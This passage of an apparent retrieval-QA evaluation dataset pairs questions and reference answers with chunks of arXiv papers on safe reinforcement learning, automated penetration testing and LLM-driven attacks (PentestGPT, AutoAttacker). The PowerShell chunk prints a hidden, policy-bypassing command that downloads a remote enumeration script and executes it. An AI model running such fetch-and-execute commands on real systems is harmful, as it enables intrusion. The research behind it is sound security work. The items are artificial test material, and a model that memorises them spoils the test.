in LLMs. PentestGPT is meticulously designed with three\nself-interacting modules, each addressing individual sub-tasks of penetration\ntesting, to mitigate the challenges related to context loss. Our evaluation\nshows that PentestGPT not only outperforms LLMs with a task-completion increase\nof 228.6\\% compared to the \\gptthree model among the benchmark targets but also\nproves effective in tackling real-world penetration testing challenges. Having\nbeen open-sourced on GitHub, PentestGPT has garnered over 4,700 stars and\nfostered active community engagement, attesting to its value and impact in both\nthe academic and industrial spheres.', 'entry_id': 'http://arxiv.org/abs/2308.06782v2', 'published_first_time': '2023-08-13', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.SE', 'categories': ['cs.SE', 'cs.CR'], 'links': ['http://arxiv.org/abs/2308.06782v2', 'http://arxiv.org/pdf/2308.06782v2']}]",True
What are some applications of safe reinforcement learning in power systems?,"['ection and Control, vol. 43, no. 4, pp. 102–107 (in Chinese), 2015.\n[4] J. Shair, H. Li, J. Hu, and X. Xie, “Power system stability issues,\nclassifications and research prospects in the context of high-penetration\nof renewables and power electronics,” Renewable and Sustainable\nEnergy Reviews, vol. 145, p. 111111, July 2021.\n[5] R. S. Sutton and A. G. Barto, Reinforcement Learning: An Introduction.\nMIT press, 2018.\n[6] W. Liu, D. Zhang, X. Wang, J. Hou, and L. Liu, “A Decision Making\nStrategy for Generating Unit Tripping Under Emergency Circumstances\nBased on Deep Reinforcement Learning,” Proceedings of the CSEE,\nvol. 38, no. 01, pp. 109–119+347, 2018.\n[7] J. Zhang, Y. Luo, B. Wang, C. Lu, J. Si, and J. Song, “Deep\nReinforcement Learning for Load Shedding Against Short-Term Voltage\nInstability in Large Power Systems,” IEEE Transactions on Neural\nNetworks and Learning Systems, pp. 1–12, 2021.\n[8] R. R. Hossain, Q. Huang, and R. Huang, “Graph Convolutional Network-\nBased Topology Embedded Deep Reinforcement Learning for Voltage\nStability Control,” IEEE Transactions on Power Systems, vol. 36,\npp. 4848–4851, Sept. 2021.\n[9] X. Chen, G. Qu, Y. Tang, S. Low, and N. Li, “Reinforcement Learning\nfor Selective Key Applications in Power Systems: Recent Advances and\nFuture Challenges,” IEEE Transactions on Smart Grid, pp. 1–1, 2022.\n[10] G. Dulac-Arnold, N. Levine, D. J. Mankowitz, J. Li, C. Paduraru,\nS. Gowal, and T. Hester, “Challenges of real-world reinforcement\nlearning: Definitions, benchmarks and analysis,” Machine Learning,\nvol. 110, pp. 2419–2468, Sept. 2021.\n[11] Y. Shi, G. Qu, S. Low, A. Anandkumar, and A. Wierman, “Stability\nConstrained Reinforcement Learning for Real-Time Voltage Control,” in\n2022 American Control Conference (ACC), pp. 2715–2721, June 2022.\n[12] T. L. Vu, S. Mukherjee, T. Yin, R. Huang, J. Tan, and Q. Huang,\n“Safe Reinforcement Learning for Emergency Load Shedding of Power\nSystems,” in 2021 IEEE Power & Energy Society General Meeting\n(PESGM), pp. 1–5, July 2021.\n[13] L. Brunke, M. Greeff, A. W. Hall, Z. Yuan, S. Zhou, J. Panerati, and A. P.\nSchoellig, “Safe Learning in Robotics: From Learning-Based Control to\nSafe Reinforcement Learning,” Annual Review of Control, Robotics, and\nAutonomous Systems, vol. 5, no. 1, pp. 411–444, 2022.\n[14] J. Li, X. Wang, S. Chen, and D. Yan, “Research and Application of Safe\nReinforcement Learning in Power System,” in 2023 8th Asia Conference\non Power and Electrical Engineering, pp. 1977–1982, Apr. 2023.\n[15] W. Wang, N. Yu, Y. Gao, and J. Shi, “Safe Off-Policy Deep Reinforce-\nment Learning Algorithm for Volt-VAR Control in Power Distribution\nSystems,” IEEE Transactions on Smart Grid, vol. 11, pp. 3008–3018,\nJuly 2020.\n[16] Y. Gao and N. Yu, “Model-augmented safe reinforcement learning\nfor Volt-VAR control in power distribution networks,” Applied Energy,\nvol. 313, p. 118762, May 2022.\n[17] P. Ren, Y. Xiao, X. Chang, P.-Y. Huang, Z. Li, B. B. Gupta, X. Chen,\nand X. Wang, “A Survey of Deep Active Learning,” ACM Computing\nSurveys, vol. 54, pp. 180:1–180:40, Oct. 2021.\n[18] V. Malbas']","Some applications of safe reinforcement learning in power systems include generating unit tripping under emergency circumstances, load shedding against short-term voltage instability, voltage stability control, real-time voltage control, and Volt-VAR control in power distribution systems.",simple,"[{'Published': '2024-05-26', 'Title': 'Make Safe Decisions in Power System: Safe Reinforcement Learning Based Pre-decision Making for Voltage Stability Emergency Control', 'Authors': 'Congbo Bi, Lipeng Zhu, Di Liu, Chao Lu', 'Summary': ""The high penetration of renewable energy and power electronic equipment bring\nsignificant challenges to the efficient construction of adaptive emergency\ncontrol strategies against various presumed contingencies in today's power\nsystems. Traditional model-based emergency control methods have difficulty in\nadapt well to various complicated operating conditions in practice. Fr emerging\nartificial intelligence-based approaches, i.e., reinforcement learning-enabled\nsolutions, they are yet to provide solid safety assurances under strict\nconstraints in practical power systems. To address these research gaps, this\npaper develops a safe reinforcement learning (SRL)-based pre-decision making\nframework against short-term voltage collapse. Our proposed framework employs\nneural networks for pre-decision formulation, security margin estimation, and\ncorrective action implementation, without reliance on precise system\nparameters. Leveraging the gradient projection, we propose a security\nprojecting correction algorithm that offers theoretical security assurances to\namend risky actions. The applicability of the algorithm is further enhanced\nthrough the incorporation of active learning, which expedites the training\nprocess and improves security estimation accuracy. Extensive numerical tests on\nthe New England 39-bus system and the realistic Guangdong Provincal Power Grid\ndemonstrate the effectiveness of the proposed framework."", 'entry_id': 'http://arxiv.org/abs/2405.16485v1', 'published_first_time': '2024-05-26', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'eess.SY', 'categories': ['eess.SY', 'cs.SY'], 'links': ['http://arxiv.org/abs/2405.16485v1', 'http://arxiv.org/pdf/2405.16485v1']}]",True
What metrics are used to assess the syntactic quality of generated PowerShell code?,"[' PowerShell code. Both the generated commands\nand their corresponding references are then subjected to the\nsyntax analyzer.\nTo assess the syntactic quality of the generated commands,\nwe introduce two distinct metrics: Single Syntax Accuracy\nand Comparative Syntax Accuracy. The metrics are defined\nas follows:\n• Single Syntax Accuracy: evaluates the percentage of\ncommands without parse errors. This evaluation is in-\ndependent of the reference commands from the ground\ntruth.\n• Comparative Syntax Accuracy: assesses the syntactic\ncorrectness of the generated commands by considering\nthe results alongside the reference commands. When\nboth commands present common parse errors, these are\nexcluded from the counting process. Given that some ref-\nerence commands include stub templates such as <code>\nTest Set\nParseError (%)\nError (%)\nWarning (%)\nCodeT5+\n8.85\n1.94\n35.92\nCodeGPT\n1.77\n2.70\n29.73\nCodeGen\n1.77\n1.80\n31.53\nGround Truth\n2.65\n0.00\n39.09\nTable 7: Summary of ParseError, Error, and Warning percent-\nages for models and ground truth on the test set.\n14\n22\n3\n4\n14\n14\n5\n2\n17\n7\n5\n4\n16\n10\n5\n6\n0\n5\n10\n15\n20\n25\nAvoidUsingInvokeExpression\n AvoidUsingCmdletAliases\n AvoidUsingWMICmdlet\n UseDeclaredVarsMoreThanAssignments\nNumber of Warnings\nWarnings \nCodeT5+\nCodeGPT\nCodeGen\nGround Truth\nFigure 4: Counts for different warning types in each test set.\nor <command>, the analysis filters out parse errors asso-\nciated with these templates, specifically the Redirection-\nNotSupported and MissingFileSpecification errors.\nThe workflow for the syntactic analysis is depicted in Fig-\nure 3. Looking at the results in Table 6, it is possible to notice\nthat all the models achieved a score greater than 90%, assess-\ning their strong capability to generate syntactically correct\ncode. CodeGPT and CodeGen, in general, demonstrate high\nperformance across both syntax metrics. Table 7 summarizes\nthe percentages for various severity types in the test set. Given\nthat warning frequencies are consistently above 30% for all\nmodels, including the ground truth, Figure 4 enumerates the\nvarious warning types within each set.\n4.4\nExecution Analysis\nThe execution analysis aims to evaluate the generated offen-\nsive PowerShell code when running in an actual system. This\ninvolves assessing the ability of the code to behave as intended\nin terms of effects caused on the system. Therefore, we run\nboth code from the ground truth and generated code, monitor\ntheir behavior at runtime, and compare the behavioral events\n10\nExecution Analysis\nWindows 10 VM\nPre-trained\nmodels\nTest Set\nReference \ncommands\nNL Intents\nGenerated\ncommands\nSysmon\nSecurity \nTools\nEvent \nFiltering\nExecution\nEvaluation\nFigure 5: Execution analysis workflow.\nGround truth\nevents\nGenerated code\nevents\n188\n151\n145\npowershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle\nHidden -Command ""IEX (Invoke-WebxRequest –Uri \'https://raw.githubusercontent.com/Powershell-\nScripts-for-Hackers-and-Pentesters/main/scripts/all_in_one_enum.ps1\').Content""Whitecat18\npowershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""Invoke-WebRequest\nhttps://raw.githubusercontent.com/Whitecat18/Powershell-Scripts-for-Hackers-and-Pentesters/main/\nscripts/all_in_one_enum.ps1 -OutFile hello.ps1; .\\hello.ps1""\npwsh.exe>C:\\Windows\\System32\\ntdll.dll\npwsh.exe>C:\\Windows\\System32\\gdi32full.dll\n...\npowershell.exe>C:\\Windows\\System32\\sxs.dll\npowershell.exe>C:\\Windows\\System32\\umpdc.dll\npwsh.exe>C:\\Windows\\System32\\ntdll.dll\npwsh.exe>C:\\Windows\\System32\\gdi32full.dll\n...\npwsh.exe>C:\\Program \nFiles\\PowerShell\\7\\System.']","The metrics used to assess the syntactic quality of generated PowerShell code are Single Syntax Accuracy and Comparative Syntax Accuracy. Single Syntax Accuracy evaluates the percentage of commands without parse errors, independent of the reference commands from the ground truth. Comparative Syntax Accuracy assesses the syntactic correctness of the generated commands by considering the results alongside the reference commands, excluding common parse errors.",simple,"[{'Published': '2024-04-19', 'Title': 'The Power of Words: Generating PowerShell Attacks from Natural Language', 'Authors': 'Pietro Liguori, Christian Marescalco, Roberto Natella, Vittorio Orbinato, Luciano Pianese', 'Summary': 'As the Windows OS stands out as one of the most targeted systems, the\nPowerShell language has become a key tool for malicious actors and\ncybersecurity professionals (e.g., for penetration testing). This work explores\nan uncharted domain in AI code generation by automatically generating offensive\nPowerShell code from natural language descriptions using Neural Machine\nTranslation (NMT). For training and evaluation purposes, we propose two novel\ndatasets with PowerShell code samples, one with manually curated descriptions\nin natural language and another code-only dataset for reinforcing the training.\nWe present an extensive evaluation of state-of-the-art NMT models and analyze\nthe generated code both statically and dynamically. Results indicate that\ntuning NMT using our dataset is effective at generating offensive PowerShell\ncode. Comparative analysis against the most widely used LLM service ChatGPT\nreveals the specialized strengths of our fine-tuned models.', 'entry_id': 'http://arxiv.org/abs/2404.12893v1', 'published_first_time': '2024-04-19', 'comment': '18th USENIX WOOT Conference on Offensive Technologies, GitHub Repo:\n  https://github.com/dessertlab/powershell-offensive-code-generation', 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.SE'], 'links': ['http://arxiv.org/abs/2404.12893v1', 'http://arxiv.org/pdf/2404.12893v1']}]",True
How does pre-decision making contribute to safeguarding power system operations?,"[' enhances the security margin\nestimator’s training process by swiftly identifying critical oper-\nating points within complex power systems. This enhancement\nsignificantly boosts the security margin estimator’s training\nefficiency. Moreover, its high practical value is underscored\nby its applicability to large-scale power systems for effectively\ncapturing critical operating conditions.\nThe remainder of the paper is structured as follows. Section\nII briefly introduces the basic knowledge of pre-decision\nmaking, SRL algorithm, and AL. Section III elaborates the\nproposed framework, including the AL-based security margin\nestimator and the gradient projection-based short-term voltage\nstability emergency control pre-decision making module. The\nNew England 39-bus system and the Guangdong Provincal\nPower Grid (GPG) are utilized to test the performance of our\nframework in Section IV. Section V concludes the paper.\nII. PRELIMINARIES\nA. Safe Reinforcement Learning (SRL)\nReinforcement learning involves continuous interaction with\nthe environment to ascertain the most effective strategy via\ntrial and error. However, in some practical applications, includ-\ning autonomous driving and power system operations, faulty\npolicies can result in substantial economic repercussions or\ncompromise safety [13]. Hence, the imperative to integrate\nsafety considerations during the training or operational phases\nin such contexts has precipitated the emergence of SRL algo-\nrithms. Depending on the form of constraints, safe reinforce-\nment learning can be categorized into two types: process-wise\nsafe reinforcement learning and state-wise safe reinforcement\nlearning. Initial endeavors of process-wise safe reinforcement\nlearning were grounded on the constrained Markov decision\nprocesses (CMDP) framework, wherein constraints are articu-\nlated as either cumulative or episodic. However, real-world\nscenarios often involve transient and deterministic critical\nconstraints, which, if violated, can lead to catastrophic task\nfailure [21]. Therefore, it is necessary to introduce more\nrobust constraints in reinforcement learning. Unlike process-\nwise safe reinforcement learning, state-wise SRL is based on\nthe SCMDP, where the safety specification is to satisfy a\nhard cost constraint at every step persistently. Similarly, the\ncost functions are denoted with C1, C2, ..., and the feasible\nstationary policy set ¯\nΠC for SCMDP is defined as:\n¯\nΠC = {π ∈Π|∀(st, at, st+1) ∼τ,\n∀i, Ci(st, at, st+1) ≤ωi}\n(1)\nwhere τ ∼π, ωi ∈R, and π is the agent’s policy. Compared\nto process-wise SRL, state-wise SRL has stronger constraint\neffects and is more suitable for scenarios with stricter state\nsecurity demand.\nThe purpose of state-wise SRL is to find a policy that max-\nimizes the cumulative gain G = P∞\nt=0 γtrt while satisfying\nthe security constraints, which is mathematically expressed as\nmax\nθ\nG(πθ),\ns.t. πθ ∈¯\nΠC\n(2)\n3\nwhere rt denotes the reward at t, γ denotes the discount factor,\nand πθ is the agent’s parameterized policy.\nB. Pre-decision making and its SCMDP Modeling\nPre-decision making plays a crucial role in preventing\nfault propagation and safeguarding power system security and\nstability. In this approach, emergency control strategies are\npre-generated based on the system’s operating state and a\npredefined set of potential faults. When a fault occurs, the\nstability control apparatus consults these pre-established rules\naccording to the fault type and the existing operating condition\nand then executes the necessary emergency control actions\naccording to pre-determined criteria. Emergency control mea-\nsures in power systems, such as load shedding, generator\ntripping, and modulating DC transmission line power, are es-\nsential for preventing system collapse and enhancing stability.\nIn this context, we focus on load shedding as a representative\nexample. Our proposed pre-decision making scheme aims to\naddress short-term voltage instability, minimizing the impact\nof faults while keeping costs as low as possible. Specifically,\nwe seek to reduce the amount of load shedding required to\nstabilize the system’s voltage after a fault. The mathematical\nformulation of the power system’s short-term voltage stability\ncontrol pre-decision making process is delineated as follows:\narg min\nat∈A']","Pre-decision making contributes to safeguarding power system operations by pre-generating emergency control strategies based on the system’s operating state and a predefined set of potential faults. When a fault occurs, the stability control apparatus consults these pre-established rules according to the fault type and the existing operating condition, and then executes the necessary emergency control actions according to pre-determined criteria. This approach helps prevent fault propagation and enhances system security and stability.",simple,"[{'Published': '2024-05-26', 'Title': 'Make Safe Decisions in Power System: Safe Reinforcement Learning Based Pre-decision Making for Voltage Stability Emergency Control', 'Authors': 'Congbo Bi, Lipeng Zhu, Di Liu, Chao Lu', 'Summary': ""The high penetration of renewable energy and power electronic equipment bring\nsignificant challenges to the efficient construction of adaptive emergency\ncontrol strategies against various presumed contingencies in today's power\nsystems. Traditional model-based emergency control methods have difficulty in\nadapt well to various complicated operating conditions in practice. Fr emerging\nartificial intelligence-based approaches, i.e., reinforcement learning-enabled\nsolutions, they are yet to provide solid safety assurances under strict\nconstraints in practical power systems. To address these research gaps, this\npaper develops a safe reinforcement learning (SRL)-based pre-decision making\nframework against short-term voltage collapse. Our proposed framework employs\nneural networks for pre-decision formulation, security margin estimation, and\ncorrective action implementation, without reliance on precise system\nparameters. Leveraging the gradient projection, we propose a security\nprojecting correction algorithm that offers theoretical security assurances to\namend risky actions. The applicability of the algorithm is further enhanced\nthrough the incorporation of active learning, which expedites the training\nprocess and improves security estimation accuracy. Extensive numerical tests on\nthe New England 39-bus system and the realistic Guangdong Provincal Power Grid\ndemonstrate the effectiveness of the proposed framework."", 'entry_id': 'http://arxiv.org/abs/2405.16485v1', 'published_first_time': '2024-05-26', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'eess.SY', 'categories': ['eess.SY', 'cs.SY'], 'links': ['http://arxiv.org/abs/2405.16485v1', 'http://arxiv.org/pdf/2405.16485v1']}]",True
How does the availability of source code reflect the cybersecurity research community's dedication to openness and active community participation?,"['\n100.00%\n(b) Source Code Available\nTable 4: Classification\nThis indicates that the proposed tools have undergone rigorous validation, guaranteeing their effectiveness\nand reliability. This emphasis on peer-reviewed tools in our study reflects our commitment to ensuring readers\nhave confidence in the credibility and utility of the tools presented. The remaining tools, which were not\nyet peer-reviewed at the time of our survey but are available as pre-print (e.g., [113, 54]), potentially under\nreview or to be submitted in the near future.\n2013\n2014\n2015\n2016\n2017\n2018\n2019\n2020\n2021\n2022\n2023\nYear\n0\n2\n4\n6\n8\n10\n12\n14\n16\nNumber of Tools\nDistribution of Tools Across Years\nFigure 6: Distribution of Tool Releases Over Last Decade\n17\nFurthermore, the distribution of tool releases over the years, as illustrated in Figure 6, shows an increase\nin development activities in recent years, with 16 tools released in 2023, 14 in 2021, and 13 in 2019. This\ntrend mirrors the evolution of cybersecurity threats and the response from the research community to address\nthese problems.\n6.2. Types of Licensing and Source Code Availability\nThis section delves into the licensing types, development activity, and source code availability for the\ntools discussed in this paper. The evaluation found that out of the 100 tools included in this study, 59 have\ntheir source code readily available on GitHub, while 41 are unavailable (Table 4b).\n0\n5\n10\n15\n20\n25\n30\n35\nNumber of Tools\nNot Available\nOpen Source - Not Specified\nOpen Source - MIT License\nOpen Source - GPLv3\nOpen Source - Apache 2.0\nAvailable upon request\nProprietary\nOpen Source - GPLv2\nOpen Source - Apache 2.0 + ISC\nOpen Source - LGPLv3\nOpen Source - CC BY-NC 4.0\nOpen Source - UPL 1.0\nLicence Type\nDistribution of Tools by Licence Type\nFigure 7: Distribution of Tools by License Type\nThe types of licenses for the tools available on GitHub vary widely (Figure 7), mostly open source\nlicences, ranging from the MIT License (17 tools), GPLv3 (8 tools). However, for 23 tools, the licence is\nNot Specified. The lack of clear licensing information could be an oversight by developers regarding the\nimportance of transparent communication of usage rights. This ambiguity may potentially hinder adoption\nand adaptability. In the absence of a license, default copyright laws apply, meaning that authors retain all\nrights to their source code and reproduction, distribution, or creation of derivative works is prohibited.\nOverall, the fact that source code is available for more than half of the tools (59 tools) demonstrates\nthe cybersecurity researchers’ dedication to openness and active community participation.\nHowever, 41\ninaccessible tools in this study highlight an ongoing debate: the need to balance transparency with security,\nprivacy, and commercial interests.\n6.3. Tools Development and Maintenance\nWe examined the GitHub repositories of the 59 publicly available tools to understand specific features\nrelated to tool development and maintenance. Specifically, we collected data on the number of Commits and\nthe dates of the first and the last commits. We believe analysing commit activity in GitHub repositories\nprovides insights into the development intensity and duration. However, we must consider that projects can\nmove from one repository to another and that a private repository is used alongside a private one, and the\npublic one is used only for dissemination purposes. Therefore, we can only attempt to capture some trends\nwith this analysis, but we must be cautious about making statements regarding specific projects.\nTable 5a provides an overview of the distribution of project activity periods. We measured the difference\nin months between the first and last commit for the considered projects. The data shows that approximately\n18\nPeriod (Months)\nNo.\n%\n0-3\n19\n32.20%\n4-6\n3\n5.08%\n6-12\n6\n10.17%\n13-24\n6\n10.17%\n25-36\n10\n16.95%\n37-60\n8\n13.56%\n61-inf\n7\n11.86%\nTotal\n59\n100.00%\n(a) Distribution of Period of Project Activity (last – first commit)\nCommits Range\nNo.\n%\n1-10\n17\n28.81%\n11-50\n19\n32.20%\n51-100\n4\n6.78%\n101-250\n6\n10.17%\n251-500\n5\n8.47%\n501-inf\n8\n13.56%\nTotal\n59\n100.']",The availability of source code for more than half of the tools (59 tools) demonstrates the cybersecurity researchers’ dedication to openness and active community participation.,simple,"[{'Published': '2024-07-19', 'Title': 'Bridging the Gap: A Survey and Classification of Research-Informed Ethical Hacking Tools', 'Authors': 'Paolo Modesti, Lewis Golightly, Louis Holmes, Chidimma Opara, Marco Moscini', 'Summary': ""The majority of Ethical Hacking (EH) tools utilised in penetration testing\nare developed by practitioners within the industry or underground communities.\nSimilarly, academic researchers have also contributed to developing security\ntools. However, there appears to be limited awareness among practitioners of\nacademic contributions in this domain, creating a significant gap between\nindustry and academia's contributions to EH tools. This research paper aims to\nsurvey the current state of EH academic research, primarily focusing on\nresearch-informed security tools. We categorise these tools into process-based\nframeworks (such as PTES and Mitre ATT\\&CK) and knowledge-based frameworks\n(such as CyBOK and ACM CCS). This classification provides a comprehensive\noverview of novel, research-informed tools, considering their functionality and\napplication areas. The analysis covers licensing, release dates, source code\navailability, development activity, and peer review status, providing valuable\ninsights into the current state of research in this field."", 'entry_id': 'http://arxiv.org/abs/2407.14255v1', 'published_first_time': '2024-07-19', 'comment': 'This is the extended version of the paper published in the Journal of\n  Cybersecurity and Privacy, 4, no. 3: pp 410-448, 2024', 'journal_ref': 'Volume 4, Issue 3: pp 410-448, 2024', 'doi': '10.3390/jcp4030021', 'primary_category': 'cs.CR', 'categories': ['cs.CR'], 'links': ['http://dx.doi.org/10.3390/jcp4030021', 'http://arxiv.org/abs/2407.14255v1', 'http://arxiv.org/pdf/2407.14255v1']}]",True
How does the Deep Q-learning with RM algorithm (DQRM) train a PT policy in the DRLRM-PT framework?,"[' as network scanning,\nexploiting vulnerabilities, lateral movement, and privilege escalation. Additionally, the agent can gather observations\nfrom the environment through the information from scanning operations, defined by an observation space containing\nnewly discovered vulnerabilities, leaked credentials, etc. The immediate reward reflects the evaluation of the agent’s\naction. The aim of PT typically involves taking ownership of critical resources within the networks, such as customer\ndata. Thus, the agent can assign a positive reward to itself when the action is beneficial for accomplishing this goal or a\nnegative reward when it is not. The agent wants to find an optimal PT policy to maximize accumulated rewards through\nlearning experiences from agent-environment interactions [19]. To tackle the challenge of high dimensionality of the\ntarget system arising from the large observation or action spaces [20], the PT policy is represented by deep neural\nnetworks to determine the best action based on input observation. During the training phase, after each step, the agent\nwill use the experience (observation, action, reward, next observation) to update the weights of the neural networks\n(iteratively improving the PT policy).\nIn this framework, the agent is informed and guided by a cybersecurity domain knowledge encoding module, which\nuses an RM to encode the domain knowledge of PT based on the cybersecurity knowledge bases, such as MITRE\nATT&CK, Cyber Kill Chain, etc.\nThe RM is a state machine with two essential functions: 1) decomposing the PT task into a series of subtasks, such as\n“discover credentials” and “privilege escalation”, and organizing them using a state machine structure; 2) specifying a\nreward function for each state transition within the RM.\nThe RM receives a set of events detected during PT as input, leading to a transition of its internal state from one state\nto another according to its transition rules (logic formula over the event set). The output of the RM includes the RM\nstate and a reward function. The RM state indicates the completion of the previous subtask and the initiation of a new\nsubtask; thus, it can be used to denote the subtask ID.\nThe event detector (also called the labeling function under the RM theory [21]) can identify occurring events, denoted\nby symbols, e.g., ‘a’ for “discovered new nodes” and ‘b’ for “discovered new credentials”, from the environment by\nanalyzing the latest agent-environment interaction. These events are designed to represent successful executions of\nadversary tactics as defined by cybersecurity knowledge bases. Because these tactics serve as the adversary’s tactical\ngoals, providing the motivation behind their actions [17]. For instance, privilege escalation is one tactic for attacking\nenterprise networks defined by ATT&CK. Therefore, the corresponding event can be defined as its successful outcome,\ni.e., “privilege escalated”. All events are predefined in an event set and can be detected using the event detector. Table 1\nshows an example of an event set designed for PT based on ATT&CK tactics.\nTable 1: Event Set of PT (P)\nEvent Symbol\nEvent Description\n‘a’\nDiscovered new nodes\n‘b’\nDiscovered new credentials\n‘c’\nLateral moved (connected to a new node)\n‘d’\nPrivilege elevated\n‘e’\nNew flags captured (new target nodes owned)\n‘f’\nAchieved the PT goal\n‘g’\nHas unused credentials\n‘h’\nTaken action to elevate the privilege\nAs an example shown in Figure 1, when events ‘h’, ‘d’, and ‘f’ are detected, the RM will transit its state from u2 to\nu3 and output u3 (subtask ID) and a constant reward function (reward = 10) according to its defined transition rule\n< h&d&f, 10 >.\nIn addition, RM outputs a reward function instead of a reward value. Thus, RM allows the agent to specify task-specific\nreward functions to enhance the flexibility of the single reward function used in traditional RL algorithms.\nFurthermore, DRLRM-PT utilizes deep Q-learning with RM algorithm (DQRM) to train a PT policy, which decom-\nposes the policy into a set of sub-policies for every subtask and can train all sub-policies simultaneously. Therefore,\nthe final PT policy actually selects the sub-policy to determine the PT action.\n2.2\nPOMDP with Reward Machine Formulation for PT\nThe proposed PT under the DRLRM-PT framework is formulated as a POMDP with RM, which is characterized by a\ntuple']","The Deep Q-learning with RM algorithm (DQRM) trains a PT policy by decomposing the policy into a set of sub-policies for every subtask and training all sub-policies simultaneously. Therefore, the final PT policy selects the sub-policy to determine the PT action.",simple,"[{'Published': '2024-05-24', 'Title': 'Knowledge-Informed Auto-Penetration Testing Based on Reinforcement Learning with Reward Machine', 'Authors': 'Yuanliang Li, Hanzheng Dai, Jun Yan', 'Summary': 'Automated penetration testing (AutoPT) based on reinforcement learning (RL)\nhas proven its ability to improve the efficiency of vulnerability\nidentification in information systems. However, RL-based PT encounters several\nchallenges, including poor sampling efficiency, intricate reward specification,\nand limited interpretability. To address these issues, we propose a\nknowledge-informed AutoPT framework called DRLRM-PT, which leverages reward\nmachines (RMs) to encode domain knowledge as guidelines for training a PT\npolicy. In our study, we specifically focus on lateral movement as a PT case\nstudy and formulate it as a partially observable Markov decision process\n(POMDP) guided by RMs. We design two RMs based on the MITRE ATT\\&CK knowledge\nbase for lateral movement. To solve the POMDP and optimize the PT policy, we\nemploy the deep Q-learning algorithm with RM (DQRM). The experimental results\ndemonstrate that the DQRM agent exhibits higher training efficiency in PT\ncompared to agents without knowledge embedding. Moreover, RMs encoding more\ndetailed domain knowledge demonstrated better PT performance compared to RMs\nwith simpler knowledge.', 'entry_id': 'http://arxiv.org/abs/2405.15908v1', 'published_first_time': '2024-05-24', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.AI', 'categories': ['cs.AI', 'cs.CR', 'cs.LG'], 'links': ['http://arxiv.org/abs/2405.15908v1', 'http://arxiv.org/pdf/2405.15908v1']}]",True
How does GPT-4 perform in completing attack tasks when leveraged by AUTOATTACKER?,"[' avoid potential out-of-\nthe-box attacks by the LLM for uncontrollable consequences.\nOur experiment results show that AUTOATTACKER is highly\neffective in completing the attack tasks when GPT-4 is the\nleveraged LLM, achieving the perfect success rate when\nsetting the temperature parameter to 0. The results on GPT-\n3.5, Llama2-7B-chat and Llama2-70B-chat are unsatisfactory\nas most of the attack tasks failed. We further evaluate the con-\ntributions of the components included by AUTOATTACKER,\ne.g., experience manager, and show that they can reduce the\nattack overhead and cost.\nContributions. We summarize the contributions as follows:\n• We present the first comprehensive study to evaluate\nthe potential of applying LLMs to human-like hands-on-\nkeyboard attacks.\n• We design a new system AUTOATTACKER for attack\nautomation with LLMs. We propose a modular agent\ndesign to obtain the attack commands precisely from\nLLMs, with a new reasoning and planning procedure.\n• We develop a new benchmark to evaluate the LLM-based\nattack automation, with attack tasks ranging from basic\nto advanced.\n• We evaluate the effectiveness of AUTOATTACKER, and\nour results show all attack tasks can be successfully\ncompleted when GPT-4 is leveraged.\nII. BACKGROUND AND RELATED WORK\nIn this work, we explore how to automate cyber-attacks\nwith the support from LLMs. We first review the prior works\nabout attack automation before the advent of LLMs. Then,\nwe describe the key concepts and techniques of LLMs that\nare relevant to this research. Finally, we discuss the security-\nrelated issues of LLMs.\nA. Cyber-attack Automation and Frameworks\nThe contemporary cyber-attacks often involve many stages,\nlike\nreconnaissance,\nvulnerability\ndiscovery,\nexploitation,\netc [16]. Though human attackers are still involved in most of\nthe stages, especially for the sophisticated attack campaigns,\nthere have been a body of works investigating how to au-\ntomate individual steps. The majority of efforts have been\nled by DARPA in programs like the Cyber Grand Challenge\n(CGC) [25] and the recent Artificial Intelligence Cyber Chal-\nlenge (AIxCC) [26], and the main focus is on automated bi-\nnary analysis, vulnerability discovery, exploit generation, and\nsoftware patching [27]. Numerous works have been published\nunder these directions, integrating and advancing techniques\nfrom software fuzzing [28]–[30], symbolic execution [27],\n[31], [32], etc.\nOn the other hand, we found that fewer works have been\ndone regarding other attack tasks. The relevant works are\nmainly about penetration testing (pentest), through which\nsecurity professionals leverage the existing hacking tools to\nsimulate real-world attacks against organizations and report\ntheir findings [33]. To date, most pentests are orchestrated\nmanually by human experts combining their specialized or-\nganizational knowledge and expertise along with using semi-\nautomated tools that run collections of programmatic auto-\nmated actions. More intelligent automation has been explored\nwith rule-based methods [34], [35] and deep reinforcement\nlearning [36]. However, none of these automated approaches\ncan cover a comprehensive set of attack tasks and adapt\nto various environments automatically. For the research with\ndeep reinforcement learning, high computational overhead and\nlatency are incurred to train a functional model and its perfor-\nmance highly depends on the model parameters configured by\noperators. At a higher level, a few works explored how to plan\ncyber-attacks automatically under specific requirements [37],\n[38].\nCyber-attack Frameworks.\nGiven that a plethora of at-\ntack techniques and strategies were identified, some cyber-\nattack frameworks were proposed to characterize them. The\ntwo popular frameworks are MITRE ATT&CK matrix [39]\nand Cyber kill chain [16]. The MITRE ATT&CK matrix\ncategorizes the tactics, techniques, and procedures (TTPs)\nemployed by attackers. Tactics represent the attacker’s goal\n(e.g., “Lateral Movement”), techniques represent the attacker’s\ndetailed action (e.g., Use “Alternate Authentication Material”),\nand procedures represent the specific technique implemen-\ntation (e.g., “Pass the Hash”). Cyber kill chain categorizes\nattacks at a high level with 7 phases (e.g., reconnaissance,\nweaponization, etc.). In this research, we choose to automate\nthe attack tasks under the framework of the MIT']","GPT-4 achieves a perfect success rate in completing attack tasks when leveraged by AUTOATTACKER, especially when the temperature parameter is set to 0.",simple,"[{'Published': '2024-03-02', 'Title': 'AutoAttacker: A Large Language Model Guided System to Implement Automatic Cyber-attacks', 'Authors': 'Jiacen Xu, Jack W. Stokes, Geoff McDonald, Xuesong Bai, David Marshall, Siyue Wang, Adith Swaminathan, Zhou Li', 'Summary': 'Large language models (LLMs) have demonstrated impressive results on natural\nlanguage tasks, and security researchers are beginning to employ them in both\noffensive and defensive systems. In cyber-security, there have been multiple\nresearch efforts that utilize LLMs focusing on the pre-breach stage of attacks\nlike phishing and malware generation. However, so far there lacks a\ncomprehensive study regarding whether LLM-based systems can be leveraged to\nsimulate the post-breach stage of attacks that are typically human-operated, or\n""hands-on-keyboard"" attacks, under various attack techniques and environments.\n  As LLMs inevitably advance, they may be able to automate both the pre- and\npost-breach attack stages. This shift may 